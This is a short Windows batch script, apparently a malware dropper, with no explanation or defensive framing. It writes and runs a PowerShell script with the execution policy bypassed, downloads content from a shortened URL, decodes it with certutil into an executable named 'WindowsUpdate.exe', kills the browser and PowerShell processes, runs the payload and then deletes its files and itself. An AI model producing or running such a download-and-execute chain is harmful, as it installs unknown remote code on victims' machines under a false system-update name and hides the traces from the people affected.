@echo off
taskkill /IM powershell.exe /F
echo $url = 'https://goo.gl/bxEUkP' > powerboost.ps1
echo $result = Invoke-WebRequest -Uri $url >> powerboost.ps1
echo $result.content ^| Out-File 'certification.txt'>> powerboost.ps1
echo exit >> powerboost.ps1
start microsoft-edge:
Powershell.exe -ExecutionPolicy ByPass -File powerboost.ps1
certutil -decode certification.txt "WindowsUpdate.exe" >nul
taskkill /IM chrome.exe /F
WindowsUpdate.exe
del /f powerboost.ps1
del /f WindowsUpdate.exe
del /f configuration_manifest.txt
del /f certification.txt
del /f emerald.txt
del /f orion.bat & exit